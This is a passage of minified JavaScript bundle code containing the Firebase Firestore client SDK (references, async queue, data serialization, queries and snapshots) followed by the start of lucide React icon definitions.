r.mockUserToken=="string")l=r.mockUserToken,f=Ws.MOCK_USER;else{l=Tze(r.mockUserToken,t._app?.options.projectId);const h=r.mockUserToken.sub||r.mockUserToken.user_id;if(!h)throw new ut(Fe.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");f=new Ws(h)}t._authCredentials=new Qqe(new Xde(l,f))}}class Tw{constructor(e,n,r){this.converter=n,this._query=r,this.type="query",this.firestore=e}withConverter(e){return new Tw(this.firestore,e,this._query)}}class vi{constructor(e,n,r){this.converter=n,this._key=r,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new Tp(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new vi(this.firestore,e,this._key)}toJSON(){return{type:vi._jsonSchemaVersion,referencePath:this._key.toString()}}static fromJSON(e,n,r){if(r5(n,vi._jsonSchema))return new vi(e,r||null,new Pt(Sr.fromString(n.referencePath)))}}vi._jsonSchemaVersion="firestore/documentReference/1.0",vi._jsonSchema={type:Bi("string",vi._jsonSchemaVersion),referencePath:Bi("string")};class Tp extends Tw{constructor(e,n,r){super(e,n,pR(r)),this._path=r,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new vi(this.firestore,null,new Pt(e))}withConverter(e){return new Tp(this.firestore,e,this._path)}}function VGe(t,e,...n){if(t=kg(t),efe("collection","path",e),t instanceof AR){const r=Sr.fromString(e,...n);return bne(r),new Tp(t,null,r)}{if(!(t instanceof vi||t instanceof Tp))throw new ut(Fe.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=t._path.child(Sr.fromString(e,...n));return bne(r),new Tp(t.firestore,null,r)}}function DI(t,e,...n){if(t=kg(t),arguments.length===1&&(e=$M.newId()),efe("doc","path",e),t instanceof AR){const r=Sr.fromString(e,...n);return yne(r),new vi(t,null,new Pt(r))}{if(!(t instanceof vi||t instanceof Tp))throw new ut(Fe.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=t._path.child(Sr.fromString(e,...n));return yne(r),new vi(t.firestore,t instanceof Tp?t.converter:null,new Pt(r))}}const ore="AsyncQueue";class are{constructor(e=Promise.resolve()){this.Xu=[],this.ec=!1,this.tc=[],this.nc=null,this.rc=!1,this.sc=!1,this.oc=[],this.M_=new Wfe(this,"async_queue_retry"),this._c=()=>{const r=Ak();r&&mt(ore,"Visibility state changed to "+r.visibilityState),this.M_.w_()},this.ac=e;const n=Ak();n&&typeof n.addEventListener=="function"&&n.addEventListener("visibilitychange",this._c)}get isShuttingDown(){return this.ec}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.uc(),this.cc(e)}enterRestrictedMode(e){if(!this.ec){this.ec=!0,this.sc=e||!1;const n=Ak();n&&typeof n.removeEventListener=="function"&&n.removeEventListener("visibilitychange",this._c)}}enqueue(e){if(this.uc(),this.ec)return new Promise((()=>{}));const n=new Cp;return this.cc((()=>this.ec&&this.sc?Promise.resolve():(e().then(n.resolve,n.reject),n.promise))).then((()=>n.promise))}enqueueRetryable(e){this.enqueueAndForget((()=>(this.Xu.push(e),this.lc())))}async lc(){if(this.Xu.length!==0){try{await this.Xu[0](),this.Xu.shift(),this.M_.reset()}catch(e){if(!Cw(e))throw e;mt(ore,"Operation failed with retryable error: "+e)}this.Xu.length>0&&this.M_.p_((()=>this.lc()))}}cc(e){const n=this.ac.then((()=>(this.rc=!0,e().catch((r=>{throw this.nc=r,this.rc=!1,zf("INTERNAL UNHANDLED ERROR: ",cre(r)),r})).then((r=>(this.rc=!1,r))))));return this.ac=n,n}enqueueAfterDelay(e,n,r){this.uc(),this.oc.indexOf(e)>-1&&(n=0);const i=sU.createAndSchedule(this,e,n,r,(s=>this.hc(s)));return this.tc.push(i),i}uc(){this.nc&&Ft(47125,{Pc:cre(this.nc)})}verifyOperationInProgress(){}async Tc(){let e;do e=this.ac,await e;while(e!==this.ac)}Ic(e){for(const n of this.tc)if(n.timerId===e)return!0;return!1}Ec(e){return this.Tc().then((()=>{this.tc.sort(((n,r)=>n.targetTimeMs-r.targetTimeMs));for(const n of this.tc)if(n.skipDelay(),e!=="all"&&n.timerId===e)break;return this.Tc()}))}dc(e){this.oc.push(e)}hc(e){const n=this.tc.indexOf(e);this.tc.splice(n,1)}}function cre(t){let e=t.message||"";return t.stack&&(e=t.stack.includes(t.message)?t.stack:t.message+`
`+t.stack),e}function ure(t){return(function(n,r){if(typeof n!="object"||n===null)return!1;const i=n;for(const s of r)if(s in i&&typeof i[s]=="function")return!0;return!1})(t,["next","error","complete"])}class H_ extends AR{constructor(e,n,r,i){super(e,n,r,i),this.type="firestore",this._queue=new are,this._persistenceKey=i?.name||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new are(e),this._firestoreClient=void 0,await e}}}function WGe(t,e){const n=typeof t=="object"?t:Lqe(),r=typeof t=="string"?t:CI,i=Dqe(n,"firestore").getImmediate({identifier:r});if(!i._initialized){const s=Aze("firestore");s&&qGe(i,...s)}return i}function lU(t){if(t._terminated)throw new ut(Fe.FAILED_PRECONDITION,"The client has already been terminated.");return t._firestoreClient||GGe(t),t._firestoreClient}function GGe(t){const e=t._freezeSettings(),n=(function(i,s,o,a){return new yVe(i,s,o,a.host,a.ssl,a.experimentalForceLongPolling,a.experimentalAutoDetectLongPolling,hhe(a.experimentalLongPollingOptions),a.useFetchStreams,a.isUsingEmulator)})(t._databaseId,t._app?.options.appId||"",t._persistenceKey,e);t._componentsProvider||e.localCache?._offlineComponentProvider&&e.localCache?._onlineComponentProvider&&(t._componentsProvider={_offline:e.localCache._offlineComponentProvider,_online:e.localCache._onlineComponentProvider}),t._firestoreClient=new FGe(t._authCredentials,t._appCheckCredentials,t._queue,n,t._componentsProvider&&(function(i){const s=i?._online.build();return{_offline:i?._offline.build(s),_online:s}})(t._componentsProvider))}class jc{constructor(e){this._byteString=e}static fromBase64String(e){try{return new jc(xs.fromBase64String(e))}catch(n){throw new ut(Fe.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+n)}}static fromUint8Array(e){return new jc(xs.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}toJSON(){return{type:jc._jsonSchemaVersion,bytes:this.toBase64()}}static fromJSON(e){if(r5(e,jc._jsonSchema))return jc.fromBase64String(e.bytes)}}jc._jsonSchemaVersion="firestore/bytes/1.0",jc._jsonSchema={type:Bi("string",jc._jsonSchemaVersion),bytes:Bi("string")};class dU{constructor(...e){for(let n=0;n<e.length;++n)if(e[n].length===0)throw new ut(Fe.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Ts(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}class mhe{constructor(e){this._methodName=e}}class Vl{constructor(e,n){if(!isFinite(e)||e<-90||e>90)throw new ut(Fe.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(n)||n<-180||n>180)throw new ut(Fe.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+n);this._lat=e,this._long=n}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}_compareTo(e){return pn(this._lat,e._lat)||pn(this._long,e._long)}toJSON(){return{latitude:this._lat,longitude:this._long,type:Vl._jsonSchemaVersion}}static fromJSON(e){if(r5(e,Vl._jsonSchema))return new Vl(e.latitude,e.longitude)}}Vl._jsonSchemaVersion="firestore/geoPoint/1.0",Vl._jsonSchema={type:Bi("string",Vl._jsonSchemaVersion),latitude:Bi("number"),longitude:Bi("number")};class Wl{constructor(e){this._values=(e||[]).map((n=>n))}toArray(){return this._values.map((e=>e))}isEqual(e){return(function(r,i){if(r.length!==i.length)return!1;for(let s=0;s<r.length;++s)if(r[s]!==i[s])return!1;return!0})(this._values,e._values)}toJSON(){return{type:Wl._jsonSchemaVersion,vectorValues:this._values}}static fromJSON(e){if(r5(e,Wl._jsonSchema)){if(Array.isArray(e.vectorValues)&&e.vectorValues.every((n=>typeof n=="number")))return new Wl(e.vectorValues);throw new ut(Fe.INVALID_ARGUMENT,"Expected 'vectorValues' field to be a number array")}}}Wl._jsonSchemaVersion="firestore/vectorValue/1.0",Wl._jsonSchema={type:Bi("string",Wl._jsonSchemaVersion),vectorValues:Bi("object")};const KGe=/^__.*__$/;class ZGe{constructor(e,n,r){this.data=e,this.fieldMask=n,this.fieldTransforms=r}toMutation(e,n){return this.fieldMask!==null?new py(e,this.data,this.fieldMask,n,this.fieldTransforms):new s5(e,this.data,n,this.fieldTransforms)}}function ghe(t){switch(t){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw Ft(40011,{Ac:t})}}class fU{constructor(e,n,r,i,s,o){this.settings=e,this.databaseId=n,this.serializer=r,this.ignoreUndefinedProperties=i,s===void 0&&this.Rc(),this.fieldTransforms=s||[],this.fieldMask=o||[]}get path(){return this.settings.path}get Ac(){return this.settings.Ac}Vc(e){return new fU({...this.settings,...e},this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}mc(e){const n=this.path?.child(e),r=this.Vc({path:n,fc:!1});return r.gc(e),r}yc(e){const n=this.path?.child(e),r=this.Vc({path:n,fc:!1});return r.Rc(),r}wc(e){return this.Vc({path:void 0,fc:!0})}Sc(e){return BI(e,this.settings.methodName,this.settings.bc||!1,this.path,this.settings.Dc)}contains(e){return this.fieldMask.find((n=>e.isPrefixOf(n)))!==void 0||this.fieldTransforms.find((n=>e.isPrefixOf(n.field)))!==void 0}Rc(){if(this.path)for(let e=0;e<this.path.length;e++)this.gc(this.path.get(e))}gc(e){if(e.length===0)throw this.Sc("Document fields must not be empty");if(ghe(this.Ac)&&KGe.test(e))throw this.Sc('Document fields cannot begin and end with "__"')}}class YGe{constructor(e,n,r){this.databaseId=e,this.ignoreUndefinedProperties=n,this.serializer=r||vR(e)}Cc(e,n,r,i=!1){return new fU({Ac:e,methodName:n,Dc:r,path:Ts.emptyPath(),fc:!1,bc:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function yhe(t){const e=t._freezeSettings(),n=vR(t._databaseId);return new YGe(t._databaseId,!!e.ignoreUndefinedProperties,n)}function QGe(t,e,n,r,i,s={}){const o=t.Cc(s.merge||s.mergeFields?2:0,e,n,i);vhe("Data must be an object, but it was:",o,r);const a=bhe(r,o);let c,l;if(s.merge)c=new Du(o.fieldMask),l=o.fieldTransforms;else if(s.mergeFields){const f=[];for(const h of s.mergeFields){const m=XGe(e,h,n);if(!o.contains(m))throw new ut(Fe.INVALID_ARGUMENT,`Field '${m}' is specified in your field mask but missing from your input data.`);tKe(f,m)||f.push(m)}c=new Du(f),l=o.fieldTransforms.filter((h=>c.covers(h.field)))}else c=null,l=o.fieldTransforms;return new ZGe(new Bc(a),c,l)}function JGe(t,e,n,r=!1){return hU(n,t.Cc(r?4:3,e))}function hU(t,e){if(whe(t=kg(t)))return vhe("Unsupported field value:",e,t),bhe(t,e);if(t instanceof mhe)return(function(r,i){if(!ghe(i.Ac))throw i.Sc(`${r._methodName}() can only be used with update() and set()`);if(!i.path)throw i.Sc(`${r._methodName}() is not currently supported inside arrays`);const s=r._toFieldTransform(i);s&&i.fieldTransforms.push(s)})(t,e),null;if(t===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),t instanceof Array){if(e.settings.fc&&e.Ac!==4)throw e.Sc("Nested arrays are not supported");return(function(r,i){const s=[];let o=0;for(const a of r){let c=hU(a,i.wc(o));c==null&&(c={nullValue:"NULL_VALUE"}),s.push(c),o++}return{arrayValue:{values:s}}})(t,e)}return(function(r,i){if((r=kg(r))===null)return{nullValue:"NULL_VALUE"};if(typeof r=="number")return FVe(i.serializer,r);if(typeof r=="boolean")return{booleanValue:r};if(typeof r=="string")return{stringValue:r};if(r instanceof Date){const s=kr.fromDate(r);return{timestampValue:PI(i.serializer,s)}}if(r instanceof kr){const s=new kr(r.seconds,1e3*Math.floor(r.nanoseconds/1e3));return{timestampValue:PI(i.serializer,s)}}if(r instanceof Vl)return{geoPointValue:{latitude:r.latitude,longitude:r.longitude}};if(r instanceof jc)return{bytesValue:Bfe(i.serializer,r._byteString)};if(r instanceof vi){const s=i.databaseId,o=r.firestore._databaseId;if(!o.isEqual(s))throw i.Sc(`Document reference is for database ${o.projectId}/${o.database} but should be for database ${s.projectId}/${s.database}`);return{referenceValue:YM(r.firestore._databaseId||i.databaseId,r._key.path)}}if(r instanceof Wl)return(function(o,a){return{mapValue:{fields:{[ufe]:{stringValue:lfe},[SI]:{arrayValue:{values:o.toArray().map((l=>{if(typeof l!="number")throw a.Sc("VectorValues must only contain numeric values.");return GM(a.serializer,l)}))}}}}}})(r,i);throw i.Sc(`Unsupported field value: ${lR(r)}`)})(t,e)}function bhe(t,e){const n={};return rfe(t)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):fy(t,((r,i)=>{const s=hU(i,e.mc(r));s!=null&&(n[r]=s)})),{mapValue:{fields:n}}}function whe(t){return!(typeof t!="object"||t===null||t instanceof Array||t instanceof Date||t instanceof kr||t instanceof Vl||t instanceof jc||t instanceof vi||t instanceof mhe||t instanceof Wl)}function vhe(t,e,n){if(!whe(n)||!tfe(n)){const r=lR(n);throw r==="an object"?e.Sc(t+" a custom object"):e.Sc(t+" "+r)}}function XGe(t,e,n){if((e=kg(e))instanceof dU)return e._internalPath;if(typeof e=="string")return Ehe(t,e);throw BI("Field path arguments must be of type string or ",t,!1,void 0,n)}const eKe=new RegExp("[~\\*/\\[\\]]");function Ehe(t,e,n){if(e.search(eKe)>=0)throw BI(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,t,!1,void 0,n);try{return new dU(...e.split("."))._internalPath}catch{throw BI(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,t,!1,void 0,n)}}function BI(t,e,n,r,i){const s=r&&!r.isEmpty(),o=i!==void 0;let a=`Function ${e}() called with invalid data`;n&&(a+=" (via `toFirestore()`)"),a+=". ";let c="";return(s||o)&&(c+=" (found",s&&(c+=` in field ${r}`),o&&(c+=` in document ${i}`),c+=")"),new ut(Fe.INVALID_ARGUMENT,a+t+c)}function tKe(t,e){return t.some((n=>n.isEqual(e)))}class _he{constructor(e,n,r,i,s){this._firestore=e,this._userDataWriter=n,this._key=r,this._document=i,this._converter=s}get id(){return this._key.path.lastSegment()}get ref(){return new vi(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new nKe(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const n=this._document.data.field(Ahe("DocumentSnapshot.get",e));if(n!==null)return this._userDataWriter.convertValue(n)}}}class nKe extends _he{data(){return super.data()}}function Ahe(t,e){return typeof e=="string"?Ehe(t,e):e instanceof dU?e._internalPath:e._delegate._internalPath}function rKe(t){if(t.limitType==="L"&&t.explicitOrderBy.length===0)throw new ut(Fe.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class pU{}class iKe extends pU{}function sKe(t,e,...n){let r=[];e instanceof pU&&r.push(e),r=r.concat(n),(function(s){const o=s.filter((c=>c instanceof gU)).length,a=s.filter((c=>c instanceof mU)).length;if(o>1||o>0&&a>0)throw new ut(Fe.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")})(r);for(const i of r)t=i._apply(t);return t}class mU extends iKe{constructor(e,n,r){super(),this._field=e,this._op=n,this._value=r,this.type="where"}static _create(e,n,r){return new mU(e,n,r)}_apply(e){const n=this._parse(e);return Che(e._query,n),new Tw(e.firestore,e.converter,UD(e._query,n))}_parse(e){const n=yhe(e.firestore);return(function(s,o,a,c,l,f,h){let m;if(l.isKeyField()){if(f==="array-contains"||f==="array-contains-any")throw new ut(Fe.INVALID_ARGUMENT,`Invalid Query. You can't perform '${f}' queries on documentId().`);if(f==="in"||f==="not-in"){dre(h,f);const w=[];for(const y of h)w.push(lre(c,s,y));m={arrayValue:{values:w}}}else m=lre(c,s,h)}else f!=="in"&&f!=="not-in"&&f!=="array-contains-any"||dre(h,f),m=JGe(a,o,h,f==="in"||f==="not-in");return ki.create(l,f,m)})(e._query,"where",n,e.firestore._databaseId,this._field,this._op,this._value)}}class gU extends pU{constructor(e,n){super(),this.type=e,this._queryConstraints=n}static _create(e,n){return new gU(e,n)}_parse(e){const n=this._queryConstraints.map((r=>r._parse(e))).filter((r=>r.getFilters().length>0));return n.length===1?n[0]:$u.create(n,this._getOperator())}_apply(e){const n=this._parse(e);return n.getFilters().length===0?e:((function(i,s){let o=i;const a=s.getFlattenedFilters();for(const c of a)Che(o,c),o=UD(o,c)})(e._query,n),new Tw(e.firestore,e.converter,UD(e._query,n)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return this.type==="and"?"and":"or"}}function lre(t,e,n){if(typeof(n=kg(n))=="string"){if(n==="")throw new ut(Fe.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!bfe(e)&&n.indexOf("/")!==-1)throw new ut(Fe.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${n}' contains a '/' character.`);const r=e.path.child(Sr.fromString(n));if(!Pt.isDocumentKey(r))throw new ut(Fe.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return Tne(t,new Pt(r))}if(n instanceof vi)return Tne(t,n._key);throw new ut(Fe.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${lR(n)}.`)}function dre(t,e){if(!Array.isArray(t)||t.length===0)throw new ut(Fe.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${e.toString()}' filters.`)}function Che(t,e){const n=(function(i,s){for(const o of i)for(const a of o.getFlattenedFilters())if(s.indexOf(a.op)>=0)return a.op;return null})(t.filters,(function(i){switch(i){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}})(e.op));if(n!==null)throw n===e.op?new ut(Fe.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${e.op.toString()}' filter.`):new ut(Fe.INVALID_ARGUMENT,`Invalid query. You cannot use '${e.op.toString()}' filters with '${n.toString()}' filters.`)}class oKe{convertValue(e,n="none"){switch(zp(e)){case 0:return null;case 1:return e.booleanValue;case 2:return pi(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,n);case 5:return e.stringValue;case 6:return this.convertBytes(Hp(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,n);case 11:return this.convertObject(e.mapValue,n);case 10:return this.convertVectorValue(e.mapValue);default:throw Ft(62114,{value:e})}}convertObject(e,n){return this.convertObjectMap(e.fields,n)}convertObjectMap(e,n="none"){const r={};return fy(e,((i,s)=>{r[i]=this.convertValue(s,n)})),r}convertVectorValue(e){const n=e.fields?.[SI].arrayValue?.values?.map((r=>pi(r.doubleValue)));return new Wl(n)}convertGeoPoint(e){return new Vl(pi(e.latitude),pi(e.longitude))}convertArray(e,n){return(e.values||[]).map((r=>this.convertValue(r,n)))}convertServerTimestamp(e,n){switch(n){case"previous":const r=hR(e);return r==null?null:this.convertValue(r,n);case"estimate":return this.convertTimestamp(M_(e));default:return null}}convertTimestamp(e){const n=$p(e);return new kr(n.seconds,n.nanos)}convertDocumentKey(e,n){const r=Sr.fromString(e);Kn($fe(r),9688,{name:e});const i=new U_(r.get(1),r.get(3)),s=new Pt(r.popFirst(5));return i.isEqual(n)||zf(`Document ${s} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${n.projectId}/${n.database}) instead.`),s}}function aKe(t,e,n){let r;return r=t?n&&(n.merge||n.mergeFields)?t.toFirestore(e,n):t.toFirestore(e):e,r}class tE{constructor(e,n){this.hasPendingWrites=e,this.fromCache=n}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class eg extends _he{constructor(e,n,r,i,s,o){super(e,n,r,i,o),this._firestore=e,this._firestoreImpl=e,this.metadata=s}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const n=new sx(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(n,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,n={}){if(this._document){const r=this._document.data.field(Ahe("DocumentSnapshot.get",e));if(r!==null)return this._userDataWriter.convertValue(r,n.serverTimestamps)}}toJSON(){if(this.metadata.hasPendingWrites)throw new ut(Fe.FAILED_PRECONDITION,"DocumentSnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e=this._document,n={};return n.type=eg._jsonSchemaVersion,n.bundle="",n.bundleSource="DocumentSnapshot",n.bundleName=this._key.toString(),!e||!e.isValidDocument()||!e.isFoundDocument()?n:(this._userDataWriter.convertObjectMap(e.data.value.mapValue.fields,"previous"),n.bundle=(this._firestore,this.ref.path,"NOT SUPPORTED"),n)}}eg._jsonSchemaVersion="firestore/documentSnapshot/1.0",eg._jsonSchema={type:Bi("string",eg._jsonSchemaVersion),bundleSource:Bi("string","DocumentSnapshot"),bundleName:Bi("string"),bundle:Bi("string")};class sx extends eg{data(e={}){return super.data(e)}}class m1{constructor(e,n,r,i){this._firestore=e,this._userDataWriter=n,this._snapshot=i,this.metadata=new tE(i.hasPendingWrites,i.fromCache),this.query=r}get docs(){const e=[];return this.forEach((n=>e.push(n))),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,n){this._snapshot.docs.forEach((r=>{e.call(n,new sx(this._firestore,this._userDataWriter,r.key,r,new tE(this._snapshot.mutatedKeys.has(r.key),this._snapshot.fromCache),this.query.converter))}))}docChanges(e={}){const n=!!e.includeMetadataChanges;if(n&&this._snapshot.excludesMetadataChanges)throw new ut(Fe.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===n||(this._cachedChanges=(function(i,s){if(i._snapshot.oldDocs.isEmpty()){let o=0;return i._snapshot.docChanges.map((a=>{const c=new sx(i._firestore,i._userDataWriter,a.doc.key,a.doc,new tE(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);return a.doc,{type:"added",doc:c,oldIndex:-1,newIndex:o++}}))}{let o=i._snapshot.oldDocs;return i._snapshot.docChanges.filter((a=>s||a.type!==3)).map((a=>{const c=new sx(i._firestore,i._userDataWriter,a.doc.key,a.doc,new tE(i._snapshot.mutatedKeys.has(a.doc.key),i._snapshot.fromCache),i.query.converter);let l=-1,f=-1;return a.type!==0&&(l=o.indexOf(a.doc.key),o=o.delete(a.doc.key)),a.type!==1&&(o=o.add(a.doc),f=o.indexOf(a.doc.key)),{type:cKe(a.type),doc:c,oldIndex:l,newIndex:f}}))}})(this,n),this._cachedChangesIncludeMetadataChanges=n),this._cachedChanges}toJSON(){if(this.metadata.hasPendingWrites)throw new ut(Fe.FAILED_PRECONDITION,"QuerySnapshot.toJSON() attempted to serialize a document with pending writes. Await waitForPendingWrites() before invoking toJSON().");const e={};e.type=m1._jsonSchemaVersion,e.bundleSource="QuerySnapshot",e.bundleName=$M.newId(),this._firestore._databaseId.database,this._firestore._databaseId.projectId;const n=[],r=[],i=[];return this.docs.forEach((s=>{s._document!==null&&(n.push(s._document),r.push(this._userDataWriter.convertObjectMap(s._document.data.value.mapValue.fields,"previous")),i.push(s.ref.path))})),e.bundle=(this._firestore,this.query._query,e.bundleName,"NOT SUPPORTED"),e}}function cKe(t){switch(t){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return Ft(61501,{type:t})}}function uKe(t){t=Sp(t,vi);const e=Sp(t.firestore,H_);return zGe(lU(e),t._key).then((n=>Ihe(e,t,n)))}m1._jsonSchemaVersion="firestore/querySnapshot/1.0",m1._jsonSchema={type:Bi("string",m1._jsonSchemaVersion),bundleSource:Bi("string","QuerySnapshot"),bundleName:Bi("string"),bundle:Bi("string")};class She extends oKe{constructor(e){super(),this.firestore=e}convertBytes(e){return new jc(e)}convertReference(e){const n=this.convertDocumentKey(e,this.firestore._databaseId);return new vi(this.firestore,null,n)}}function The(t,e,n){t=Sp(t,vi);const r=Sp(t.firestore,H_),i=aKe(t.converter,e,n);return lKe(r,[QGe(yhe(r),"setDoc",t._key,i,t.converter!==null,n).toMutation(t._key,xf.none())])}function xhe(t,...e){t=kg(t);let n={includeMetadataChanges:!1,source:"default"},r=0;typeof e[r]!="object"||ure(e[r])||(n=e[r++]);const i={includeMetadataChanges:n.includeMetadataChanges,source:n.source};if(ure(e[r])){const c=e[r];e[r]=c.next?.bind(c),e[r+1]=c.error?.bind(c),e[r+2]=c.complete?.bind(c)}let s,o,a;if(t instanceof vi)o=Sp(t.firestore,H_),a=pR(t._key.path),s={next:c=>{e[r]&&e[r](Ihe(o,t,c))},error:e[r+1],complete:e[r+2]};else{const c=Sp(t,Tw);o=Sp(c.firestore,H_),a=c._query;const l=new She(o);s={next:f=>{e[r]&&e[r](new m1(o,l,c,f))},error:e[r+1],complete:e[r+2]},rKe(t._query)}return(function(l,f,h,m){const b=new dhe(m),w=new nhe(f,b,h);return l.asyncQueue.enqueueAndForget((async()=>ehe(await ZD(l),w))),()=>{b.Nu(),l.asyncQueue.enqueueAndForget((async()=>the(await ZD(l),w)))}})(lU(o),a,i,s)}function lKe(t,e){return(function(r,i){const s=new Cp;return r.asyncQueue.enqueueAndForget((async()=>NGe(await HGe(r),i,s))),s.promise})(lU(t),e)}function Ihe(t,e,n){const r=n.docs.get(e._key),i=new She(t);return new eg(t,i,e._key,r,new tE(n.hasPendingWrites,n.fromCache),e.converter)}(function(e,n=!0){(function(i){_w=i})(Uqe),_I(new D_("firestore",((r,{instanceIdentifier:i,options:s})=>{const o=r.getProvider("app").getImmediate(),a=new H_(new Jqe(r.getProvider("auth-internal")),new tVe(o,r.getProvider("app-check-internal")),(function(l,f){if(!Object.prototype.hasOwnProperty.apply(l.options,["projectId"]))throw new ut(Fe.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new U_(l.options.projectId,f)})(o,i),o);return s={useFetchStreams:n,...s},a._setSettings(s),a}),"PUBLIC").setMultipleInstances(!0)),h1(hne,pne,e),h1(hne,pne,"esm2020")})();const dKe=t=>t.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),fKe=t=>t.replace(/^([A-Z])|[\s-_]+(\w)/g,(e,n,r)=>r?r.toUpperCase():n.toLowerCase()),fre=t=>{const e=fKe(t);return e.charAt(0).toUpperCase()+e.slice(1)},Rhe=(...t)=>t.filter((e,n,r)=>!!e&&e.trim()!==""&&r.indexOf(e)===n).join(" ").trim(),hKe=t=>{for(const e in t)if(e.startsWith("aria-")||e==="role"||e==="title")return!0};var pKe={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const mKe=un.forwardRef(({color:t="currentColor",size:e=24,strokeWidth:n=2,absoluteStrokeWidth:r,className:i="",children:s,iconNode:o,...a},c)=>un.createElement("svg",{ref:c,...pKe,width:e,height:e,stroke:t,strokeWidth:r?Number(n)*24/Number(e):n,className:Rhe("lucide",i),...!s&&!hKe(a)&&{"aria-hidden":"true"},...a},[...o.map(([l,f])=>un.createElement(l,f)),...Array.isArray(s)?s:[s]]));const Xu=(t,e)=>{const n=un.forwardRef(({className:r,...i},s)=>un.createElement(mKe,{ref:s,iconNode:e,className:Rhe(`lucide-${dKe(fre(t))}`,`lucide-${t}`,r),...i}));return n.displayName=fre(t),n};const gKe=[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]],Phe=Xu("check",gKe);const yKe=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],yU=Xu("chevron-right",yKe);const bKe=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]],hre=Xu("circle-alert",bKe);const wKe=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],Nhe=Xu("circle-check",wKe);const vKe=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],EKe=Xu("copy",vKe);const _Ke=[["path",{d:"m18.226 5.226-2.52-2.52A2.4 2.4 0 0 0 14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 